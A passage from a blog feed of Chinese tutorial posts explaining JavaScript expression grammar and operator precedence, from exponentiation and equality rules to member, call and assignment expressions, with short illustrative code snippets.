class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">delete <span class="selector-tag">a</span><span class="selector-class">.b</span>;</span><br><span class="line">void <span class="selector-tag">a</span>;</span><br><span class="line">typeof <span class="selector-tag">a</span>;</span><br><span class="line">- <span class="selector-tag">a</span>;</span><br><span class="line">~ <span class="selector-tag">a</span>;</span><br><span class="line">! <span class="selector-tag">a</span>;</span><br><span class="line">await <span class="selector-tag">a</span>;</span><br></pre></td></tr></table></figure><p>它的特点就是一个更新表达式搭配了一个一元运算符。</p><h2 id="乘方表达式-ExponentiationExpression"><a href="#乘方表达式-ExponentiationExpression" class="headerlink" title="乘方表达式 ExponentiationExpression"></a>乘方表达式 ExponentiationExpression</h2><p>乘方表达式也是由更新表达式构成的。它使用**号。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">++i ** <span class="number">30</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">30</span> <span class="regexp">//</span>正确</span><br><span class="line">-<span class="number">2</span> ** <span class="number">30</span> <span class="regexp">//</span>报错</span><br></pre></td></tr></table></figure><p>我们看一下例子，-2 这样的一元运算表达式，是不可以放入乘方表达式的，如果需要表达类似的逻辑，必须加括号。</p><p>这里我们需要注意一下结合性，** 运算是右结合的，这跟其它正常的运算符（也就是左结合运算符）都不一样。</p><p>我们来看一个例子。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> ** <span class="number">3</span> ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 事实上，它是这样被运算的： </span><br><span class="line"><span class="number">4</span> ** (<span class="number">3</span> ** <span class="number">2</span>)</span><br><span class="line"><span class="regexp">//</span> 而不是这样被运算的：</span><br><span class="line">(<span class="number">4</span> ** <span class="number">3</span>) ** <span class="number">2</span></span><br></pre></td></tr></table></figure><p>我们来实际在代码中执行一下试试。最终结果是 262144， 而不是 4096。</p><h2 id="乘法表达式-MultiplicativeExpression"><a href="#乘法表达式-MultiplicativeExpression" class="headerlink" title="乘法表达式 MultiplicativeExpression"></a>乘法表达式 MultiplicativeExpression</h2><p>到这里，我们进入了比较熟悉的表达式类型，乘方表达式可以构成乘法表达式，用乘号或者除号、取余符号连接就可以了，我们看看例子：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x * <span class="number">2</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>乘法表达式有三种运算符：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span></span><br><span class="line"><span class="bullet"></span>/</span><br><span class="line">%</span><br></pre></td></tr></table></figure><p>它们分别表示乘、除和取余。它们的优先级是一样的，所以统一放在乘法运算表达式中。</p><h2 id="加法表达式-AdditiveExpression"><a href="#加法表达式-AdditiveExpression" class="headerlink" title="加法表达式 AdditiveExpression"></a>加法表达式 AdditiveExpression</h2><p>加法表达式是由乘法表达式用加号或者减号连接构成的。我们看下例子:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span> + <span class="selector-tag">b</span> * c</span><br></pre></td></tr></table></figure><p>加法表达式有加号和减号两种运算符。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ </span></span><br><span class="line"><span class="deletion">-</span></span><br></pre></td></tr></table></figure><p>这就是我们小学学的加法和减法的意思了。不过要注意，加号还能表示字符串连接，这也比较符合一般的直觉。</p><h2 id="移位表达式-ShiftExpression"><a href="#移位表达式-ShiftExpression" class="headerlink" title="移位表达式 ShiftExpression"></a>移位表达式 ShiftExpression</h2><p>移位表达式由加法表达式构成，移位是一种位运算，分成三种：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt; 向左移位</span><br><span class="line"><span class="meta prompt_">&gt;&gt;</span> 向右移位</span><br><span class="line">&gt;&gt;&gt; 无符号向右移位</span><br></pre></td></tr></table></figure><p>移位运算把操作数看做二进制表示的整数，然后移动特定位数。所以左移 n 位相当于乘以 2 的 n 次方，右移 n 位相当于除以 2 取整 n 次。</p><p>普通移位会保持正负数。无符号移位会把减号视为符号位 1，同时参与移位：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-1 &gt;&gt;&gt; 1</span></span><br></pre></td></tr></table></figure><p>这个会得到 2147483647，也就是 2 的 31 次方，跟负数的二进制表示法相关，这里就不详细讲解了。</p><p>在 JavaScript 中，二进制操作整数并不能提高性能，移位运算这里也仅仅作为一种数学运算存在，这些运算存在的意义也仅仅是照顾 C 系语言用户的习惯了。</p><h2 id="关系表达式-RelationalExpression"><a href="#关系表达式-RelationalExpression" class="headerlink" title="关系表达式 RelationalExpression"></a>关系表达式 RelationalExpression</h2><p>移位表达式可以构成关系表达式，这里的关系表达式就是大于、小于、大于等于、小于等于等运算符号连接，统称为关系运算。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="operator">=</span></span><br><span class="line">&gt;<span class="operator">=</span></span><br><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">instanceof </span><br><span class="line">in</span><br></pre></td></tr></table></figure><p>需要注意，这里的 &lt;&#x3D; 和 &gt;&#x3D; 关系运算，完全是针对数字的，所以 &lt;&#x3D; 并不等价于 &lt; 或 &#x3D;&#x3D;。例如：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span> &lt;= <span class="literal">undefined</span></span><br><span class="line"><span class="comment">//false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>请你务必不要用数学上的定义去理解这些运算符。</p><h2 id="相等表达式-EqualityExpression"><a href="#相等表达式-EqualityExpression" class="headerlink" title="相等表达式 EqualityExpression"></a>相等表达式 EqualityExpression</h2><p>在语法上，相等表达式是由关系表达式用相等比较运算符（如 &#x3D;&#x3D;）连接构成的。所以我们可以像下面这段代码一样使用，而不需要加括号。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a instanceof <span class="string">&quot;object&quot;</span> <span class="operator">=</span><span class="operator">=</span> true</span><br></pre></td></tr></table></figure><p>相等表达式由四种运算符和关系表达式构成，我们来看一下运算符：</p><ul><li>&#x3D;&#x3D;</li><li>!&#x3D;</li><li>&#x3D;&#x3D;&#x3D;</li><li>!&#x3D;&#x3D;</li></ul><p>相等表达式又包含一个 JavaScript 中著名的设计失误，那就是 &#x3D;&#x3D; 的行为。</p><p>一些编程规范甚至要求完全避免使用 &#x3D;&#x3D; 运算，我觉得这样规定是比较合理的，但是这里我还是尽量解释一下 &#x3D;&#x3D; 的行为。</p><p>虽然标准中写的&#x3D;&#x3D;十分复杂，但是归根结底，类型不同的变量比较时&#x3D;&#x3D;运算只有三条规则：</p><ul><li>undefined 与 null 相等；</li><li>字符串和 bool 都转为数字再比较；</li><li>对象转换成 primitive 类型再比较。</li></ul><p>这样我们就可以理解一些不太符合直觉的例子了，比如：</p><ul><li>false &#x3D;&#x3D; ‘0’  &#x2F;&#x2F; true</li><li>true &#x3D;&#x3D; ‘true’ &#x2F;&#x2F; false</li><li>[] &#x3D;&#x3D; 0 &#x2F;&#x2F; true</li><li>[] &#x3D;&#x3D; false &#x2F;&#x2F; true</li><li>new Boolean(‘false’) &#x3D;&#x3D; false &#x2F;&#x2F; false</li></ul><p>这里不太符合直觉的有两点：</p><ul><li>一个是即使字符串与 boolean 比较，也都要转换成数字；</li><li>另一个是对象如果转换成了 primitive 类型跟等号另一边类型恰好相同，则不需要转换成数字。</li></ul><p>此外，&#x3D;&#x3D; 的行为也经常跟 if 的行为（转换为 boolean）混淆。总之，我建议，仅在确认 &#x3D;&#x3D; 发生在 Number 和 String 类型之间时使用，比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="selector-class">.getElementsByTagName</span>(<span class="string">&#x27;input&#x27;</span>)<span class="selector-attr">[0]</span><span class="selector-class">.value</span> == <span class="number">100</span></span><br></pre></td></tr></table></figure><p>在这个例子中，等号左边必然是 string，右边的直接量必然是 number，这样使用 &#x3D;&#x3D; 就没有问题了。</p><h2 id="位运算表达式"><a href="#位运算表达式" class="headerlink" title="位运算表达式"></a>位运算表达式</h2><p>位运算表达式含有三种：</p><ul><li>按位与表达式 BitwiseANDExpression</li><li>按位异或表达式 BitwiseANDExpression</li><li>按位或表达式 BitwiseORExpression。</li></ul><p>位运算表达式关系比较紧密，我们这里放到一起来讲。</p><p>按位与表达式由按位与运算符（&amp;）连接按位异或表达式构成，按位与表达式把操作数视为二进制整数，然后把两个操作数按位做与运算。</p><p>按位异或表达式由按位异或运算符（^）连接按位与表达式构成，按位异或表达式把操作数视为二进制整数，然后把两个操作数按位做异或运算。异或两位相同时得 0，两位不同时得 1。</p><p>异或运算有个特征，那就是两次异或运算相当于取消。所以有一个异或运算的小技巧，就是用异或运算来交换两个整数的值。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let a = <span class="number">102</span>, <span class="keyword">b </span>= <span class="number">324</span>;</span><br><span class="line"></span><br><span class="line">a = a ^ <span class="keyword">b;</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">b </span>= a ^ <span class="keyword">b;</span></span><br><span class="line"><span class="keyword"></span>a = a ^ <span class="keyword">b;</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">console.log(a, <span class="keyword">b);</span></span><br></pre></td></tr></table></figure><p>按位或表达式由按位或运算符（|）连接相等表达式构成，按位或表达式把操作数视为二进制整数，然后把两个操作数按位做或运算。</p><p>按位或运算常常被用在一种叫做 Bitmask 的技术上。Bitmask 相当于使用一个整数来当做多个布尔型变量，现在已经不太提倡了。不过一些比较老的 API 还是会这样设计，比如我们在 DOM 课程中，提到过的 Iterator API，我们看下例子：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var iterator = document.createNodeIterator(document.body, NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT, null, <span class="literal">false</span>);</span><br><span class="line">var <span class="keyword">node</span><span class="title">;</span></span><br><span class="line"><span class="title">while</span>(<span class="keyword">node</span> <span class="title">= iterator</span>.nextNode())</span><br><span class="line">&#123;</span><br><span class="line">    console.log(<span class="keyword">node</span><span class="title">);</span></span><br><span class="line"><span class="title">&#125;</span></span><br></pre></td></tr></table></figure><p>这里的第二个参数就是使用了 Bitmask 技术，所以必须配合位运算表达式才能方便地传参。</p><h2 id="逻辑与表达式和逻辑或表达式"><a href="#逻辑与表达式和逻辑或表达式" class="headerlink" title="逻辑与表达式和逻辑或表达式"></a>逻辑与表达式和逻辑或表达式</h2><p>逻辑与表达式由按位或表达式经过逻辑与运算符连接构成，逻辑或表达式则由逻辑与表达式经逻辑或运算符连接构成。</p><p>这里需要注意的是，这两种表达式都不会做类型转换，所以尽管是逻辑运算，但是最终的结果可能是其它类型。</p><p>比如：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">false <span class="string">|| 1;</span></span><br></pre></td></tr></table></figure><p>这句将会得到结果 1。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span> &amp;&amp; <span class="literal">undefined</span>;</span><br></pre></td></tr></table></figure><p>这句将会得到 undefined。</p><p>另外还有一点，就是逻辑表达式具有短路的特性，例如：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable"><span class="literal">true</span></span> || <span class="function"><span class="title">foo</span>();</span></span><br></pre></td></tr></table></figure><p>这里的 foo 将不会被执行，这种中断后面表达式执行的特性就叫做短路。</p><h2 id="这里的-foo-将不会被执行，这种中断后面表达式执行的特性就叫做短路。"><a href="#这里的-foo-将不会被执行，这种中断后面表达式执行的特性就叫做短路。" class="headerlink" title="这里的 foo 将不会被执行，这种中断后面表达式执行的特性就叫做短路。"></a>这里的 foo 将不会被执行，这种中断后面表达式执行的特性就叫做短路。</h2><p>条件表达式由逻辑或表达式和条件运算符构成，条件运算符又称三目运算符，它有三个部分，由两个运算符?和:配合使用。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition ? branch1 : <span class="type">branch2</span></span><br></pre></td></tr></table></figure><p>这里需要注意，条件表达式也像逻辑表达式一样，可能忽略后面表达式的计算。这一点跟 C 语言的条件表达式是不一样的。</p><p>条件表达式实际上就是 JavaScript 中的右值表达式了 RightHandSideExpression，是可以放到赋值运算后面的表达式。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11丨JavaScript-什么是表达式语句</title>
      <link href="/Blog/2019/01/29/relearn_FE/11%E4%B8%A8JavaScript-%E4%BB%80%E4%B9%88%E6%98%AF%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E5%8F%A5/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/11%E4%B8%A8JavaScript-%E4%BB%80%E4%B9%88%E6%98%AF%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E5%8F%A5/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>表达式语句实际上就是一个表达式，它是由运算符连接变量或者直接量构成的（关于直接量我们在下一节详细讲解）。<br>一般来说，我们的表达式语句要么是函数调用，要么是赋值，要么是自增、自减，否则表达式计算的结果没有任何意义。</p></blockquote><h2 id="PrimaryExpression-主要表达式"><a href="#PrimaryExpression-主要表达式" class="headerlink" title="PrimaryExpression 主要表达式"></a>PrimaryExpression 主要表达式</h2><p>首先我们来给你讲解一下表达式的原子项：Primary Expression。它是表达式的最小单位，它所涉及的语法结构也是优先级最高的。</p><p>Primary Expression 包含了各种“直接量”，直接量就是直接用某种语法写出来的具有特定类型的值。我们已经知道，在运行时有各种值，比如数字 123，字符串 Hello world，所以通俗地讲，直接量就是在代码中把它们写出来的语法。</p><p>我们在类型部分，已经介绍过一些基本类型的直接量。比如，我们当时用 null 关键字获取 null 值，这个用法就是 null 直接量，这里我们仅仅把它们简单回顾一下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;abc&quot;</span><span class="comment">;</span></span><br><span class="line"><span class="number">123</span><span class="comment">;</span></span><br><span class="line">null<span class="comment">;</span></span><br><span class="line">true<span class="comment">;</span></span><br><span class="line">false<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>除这些之外，JavaScript 还能够直接量的形式定义对象，针对函数、类、数组、正则表达式等特殊对象类型，JavaScript 提供了语法层面的支持。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;)<span class="comment">;</span></span><br><span class="line">(function()&#123;&#125;)<span class="comment">;</span></span><br><span class="line">(class&#123; &#125;)<span class="comment">;</span></span><br><span class="line">[]<span class="comment">;</span></span><br><span class="line">/abc/g<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>需要注意，在语法层面，function、{ 和 class 开头的表达式语句与声明语句有语法冲突，所以，我们要想使用这样的表达式，必须加上括号来回避语法冲突。</p><p>在 JavaScript 标准中，这些结构有的被称作直接量（Literal），有的被称作表达式（**Expression），在我看来，把它们都理解成直接量比较合适。</p><p>Primary Expression 还可以是 this 或者变量，在语法上，把变量称作“标识符引用”。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this<span class="comment">;</span></span><br><span class="line">myVar<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>任何表达式加上圆括号，都被认为是 Primary Expression，这个机制使得圆括号成为改变运算优先顺序的手段。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="selector-tag">a</span> + <span class="selector-tag">b</span>);</span><br></pre></td></tr></table></figure><p>这就是 Primary Expression 的几种形式了，接下来，我们讲讲由 Primary Expression 构成的更复杂的表达式：Member Expression。</p><h2 id="MemberExpression-成员表达式"><a href="#MemberExpression-成员表达式" class="headerlink" title="MemberExpression 成员表达式"></a>MemberExpression 成员表达式</h2><p>Member Expression 通常是用于访问对象成员的。它有几种形式：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.b<span class="comment">;</span></span><br><span class="line">a[<span class="string">&quot;b&quot;</span>]<span class="comment">;</span></span><br><span class="line">new.target<span class="comment">;</span></span><br><span class="line">super.b<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>前面两种用法都很好理解，就是用标识符的属性访问和用字符串的属性访问。而 new.target 是个新加入的语法，用于判断函数是否是被 new 调用，super 则是构造函数中，用于访问父类的属性的语法。</p><p>从名字就可以看出，Member Expression 最初设计是为了属性访问的，不过从语法结构需要，以下两种在 JavaScript 标准中当做 Member Expression：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f<span class="string">`a<span class="subst">$&#123;b&#125;</span>c`</span>;</span><br></pre></td></tr></table></figure><p>这是一个是带函数的模板，这个带函数名的模板表示把模板的各个部分算好后传递给一个函数。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="keyword">Cls</span>();</span><br></pre></td></tr></table></figure><p>另一个是带参数列表的 new 运算，注意，不带参数列表的 new 运算优先级更低，不属于 Member Expression。</p><p>实际上，这两种被放入 Member Expression，仅仅意味着它们跟属性运算属于同一优先级，没有任何语义上的关联。接下来我们看看 Member Expression 能组成什么。</p><h2 id="NewExpression-NEW-表达式"><a href="#NewExpression-NEW-表达式" class="headerlink" title="NewExpression NEW 表达式"></a>NewExpression NEW 表达式</h2><p>这种非常简单，Member Expression 加上 new 就是 New Expression（当然，不加 new 也可以构成 New Expression，JavaScript 中默认独立的高优先级表达式都可以构成低优先级表达式）。</p><p>注意，这里的 New Expression 特指没有参数列表的表达式。我们看个稍微复杂的例子：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="keyword">new</span> <span class="keyword">Cls</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>直观看上去，它可能有两种意思：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="keyword">new</span> <span class="type"></span>(<span class="keyword">new</span> <span class="type">Cls</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="keyword">new</span> <span class="type"></span>(<span class="keyword">new</span> <span class="type">Cls</span>)(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>实际上，它等价于第一种。我们可以用以下代码来验证：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cls</span>&#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;cls&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">class</span> &#123;</span><br><span class="line">      <span class="title function_">constructor</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;returned&quot;</span>, n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> (<span class="keyword">new</span> <span class="title class_">Cls</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>这段代码最后得到了下面这样的结果。</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cls <span class="number">1</span></span><br><span class="line">returned <span class="literal">undefined</span></span><br></pre></td></tr></table></figure><h2 id="CallExpression-函数调用表达式"><a href="#CallExpression-函数调用表达式" class="headerlink" title="CallExpression 函数调用表达式"></a>CallExpression 函数调用表达式</h2><p>除了 New Expression，Member Expression 还能构成 Call Expression。它的基本形式是 Member Expression 后加一个括号里的参数列表，或者我们可以用上 super 关键字代替 Member Expression。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-class">.b</span>(c);</span><br><span class="line">super();</span><br></pre></td></tr></table></figure><p>这看起来很简单，但是它有一些变体。比如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-class">.b</span>(c)(d)(e);</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.b</span>(c)<span class="selector-attr">[3]</span>;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.b</span>(c)<span class="selector-class">.d</span>;</span><br><span class="line"><span class="selector-tag">a</span><span class="selector-class">.b</span>(c)`xyz`;</span><br></pre></td></tr></table></figure><p>这些变体的形态，跟 Member Expression 几乎是一一对应的。实际上，我们可以理解为，Member Expression 中的某一子结构具有函数调用，那么整个表达式就成为了一个 Call Expression。</p><p>而 Call Expression 就失去了比 New Expression 优先级高的特性，这是一个主要的区分。</p><h2 id="LeftHandSideExpression-左值表达式"><a href="#LeftHandSideExpression-左值表达式" class="headerlink" title="LeftHandSideExpression 左值表达式"></a>LeftHandSideExpression 左值表达式</h2><p>接下来，我们需要理解一个概念：New Expression 和 Call Expression 统称 LeftHandSideExpression，左值表达式。</p><p>我们直观地讲，左值表达式就是可以放到等号左边的表达式。JavaScript 语法则是下面这样。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a() <span class="operator">=</span> b<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这样的用法其实是符合语法的，只是，原生的 JavaScript 函数，返回的值都不能被赋值。因此多数时候，我们看到的赋值将会是 Call Expression 的其它形式，如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a().c <span class="operator">=</span> b<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>另外，根据 JavaScript 运行时的设计，不排除某些宿主会提供返回引用类型的函数，这时候，赋值就是有效的了。</p><p>左值表达式最经典的用法是用于构成赋值表达式，但是其实如果你翻一翻 JavaScript 标准，你会发现它出现在各种场合，凡是需要“可以被修改的变量”的位置，都能见到它的身影。</p><p>那么接下来我们就讲讲 AssignmentExpression 赋值表达式。</p><h2 id="AssignmentExpression-赋值表达式"><a href="#AssignmentExpression-赋值表达式" class="headerlink" title="AssignmentExpression 赋值表达式"></a>AssignmentExpression 赋值表达式</h2><p>AssignmentExpression 赋值表达式也有多种形态，最基本的当然是使用等号赋值：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span> <span class="operator">=</span> b</span><br></pre></td></tr></table></figure><p>这里需要理解的一个稍微复杂的概念是，这个等号是可以嵌套的：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span> <span class="operator">=</span> b <span class="operator">=</span> c <span class="operator">=</span> d</span><br></pre></td></tr></table></figure><p>这样的连续赋值，是右结合的，它等价于下面这种：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span> <span class="operator">=</span> (b <span class="operator">=</span> (c <span class="operator">=</span> d))</span><br></pre></td></tr></table></figure><p>也就是说，先把 d 的结果赋值给 c，再把整个表达式的结果赋值给 b，再赋值给 a。</p><p><strong>当然，这并非一个很好的代码风格，我们讲解语法是为了让你理解这样的用法，而不是推荐你这样写代码。</strong></p><p>赋值表达式的使用，还可以结合一些运算符，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a += b;</span><br><span class="line"><span class="regexp">//</span> 相当于</span><br><span class="line">a = a + b;</span><br></pre></td></tr></table></figure><p>能有这样用的运算符有下面这几种：</p><p><code>*=、/=、%=、+=、-=、&lt;&lt;=、&gt;&gt;=、&gt;&gt;&gt;=、&amp;=、^=、|=、**=</code></p><p>我想你已经注意到了，赋值表达式的等号左边和右边能用的表达式类型不一样，我们已经关注完了表达式的左边部分（左值表达式）的语法结构。</p><h2 id="Expression-表达式"><a href="#Expression-表达式" class="headerlink" title="Expression 表达式"></a>Expression 表达式</h2><p>赋值表达式可以构成 Expression 表达式的一部分。在 JavaScript 中，表达式就是用逗号运算符连接的赋值表达式。</p><p>在 JavaScript 中，比赋值运算优先级更低的就是逗号运算符了。我们可以把逗号可以理解为一种小型的分号。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = b, b = <span class="number">1</span>, null<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>逗号分隔的表达式会顺次执行，就像不同的表达式语句一样。“整个表达式的结果”就是“最后一个逗号后的表达式结果”。比如我们文中的例子，整个“a &#x3D; b, b &#x3D; 1, null;”表达式的结果就是“，”后面的null。</p><blockquote><p>在很多场合，都不允许使用带逗号的表达式，比如我们在前面提到，export 后只能跟赋值表达式，意思就是表达式中不能含有逗号。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10丨JavaScript-语句</title>
      <link href="/Blog/2019/01/29/relearn_FE/10%E4%B8%A8JavaScript-%E8%AF%AD%E5%8F%A5/index/"/>
      <url>/Blog/2019/01/29/relearn_FE/10%E4%B8%A8JavaScript-%E8%AF%AD%E5%8F%A5/index/</url>
      
        <content type="html"><![CDATA[<h2 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h2><ul><li>普通语句：<br><img src="/Blog/2019/01/29/relearn_FE/10%E4%B8%A8JavaScript-%E8%AF%AD%E5%8F%A5/index/img.png"></li><li>声明型语句：<br><img src="/Blog/2019/01/29/relearn_FE/10%E4%B8%A8JavaScript-%E8%AF%AD%E5%8F%A5/index/img_1.png"></li></ul><blockquote><p>声明型语句跟普通语句最大区别就是声明型语句响应预处理过程，普通语句只有执行过程。</p></blockquote><h2 id="普通语句"><a href="#普通语句" class="headerlink" title="普通语句"></a>普通语句</h2><h3 id="语句块"><a href="#语句块" class="headerlink" title="语句块"></a>语句块</h3><p>我们可以这样去简单理解，语句块就是一对大括号。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attribute">var</span> x, y;</span><br><span class="line">    <span class="attribute">x</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="attribute">y</span> = <span class="number">20</span>;</span><br><span 